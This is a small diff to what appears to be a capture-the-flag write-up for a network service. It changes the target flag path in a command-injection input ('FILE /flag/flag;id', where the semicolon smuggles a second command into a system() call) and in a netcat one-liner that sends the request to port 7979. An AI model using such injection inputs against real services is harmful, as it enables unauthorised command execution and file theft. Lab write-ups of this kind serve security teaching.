@@ -17,7 +17,7 @@ The argument after `FILE ` is passed directly to `system()` via `cat <arg>`.
 Shell metacharacters are not escaped.
 
 ```
-FILE /flag.txt;id
+FILE /flag/flag;id
 ```
 
 ### 2. `PAYCHECK` — Format String
@@ -51,7 +51,7 @@ The binary was compiled for Windows 2000 (x86, Cygwin) — no ASLR, no stack can
 ## Exploit (FILE — command injection)
 
 ```bash
-echo -e "FILE /flag.txt" | nc <host> 7979
+echo -e "FILE /flag/flag" | nc <host> 7979
 ```
 
 ## Flag
